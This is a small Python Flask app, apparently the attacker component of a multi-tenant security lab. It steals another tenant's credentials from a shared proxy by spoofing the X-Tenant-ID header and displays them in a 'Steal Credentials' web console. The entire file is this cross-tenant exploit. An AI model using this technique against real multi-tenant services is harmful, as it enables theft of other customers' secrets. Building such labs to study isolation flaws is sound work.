"""Tenant B — attacker tenant. Exploits weak isolation in shared proxy."""
import urllib.request
from flask import Flask, render_template_string

app = Flask(__name__)

HTML = """<!DOCTYPE html><html><head><title>Tenant B Console</title></head><body>
<h1>Tenant B — Metadata Explorer</h1>
<form method="get" action="/steal">
<label>Target Tenant ID: <input name="tenant" value="tenant-a"></label>
<button>Steal Credentials</button></form>
<pre>{{output}}</pre></body></html>"""

@app.route("/")
def home(): return render_template_string(HTML, output="Ready")

@app.route("/steal")
def steal():
    target = "tenant-a"  # Fixed target for simplicity
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            "http://shared:5000/metadata/credentials",
            headers={"X-Tenant-ID": target}), timeout=5)
        return render_template_string(HTML, output=f"[+] Cross-Tenant Credentials:\n{r.read().decode()}")
    except Exception as e:
        return render_template_string(HTML, output=f"Error: {e}")

if __name__ == "__main__": app.run(host="0.0.0.0", port=5000)
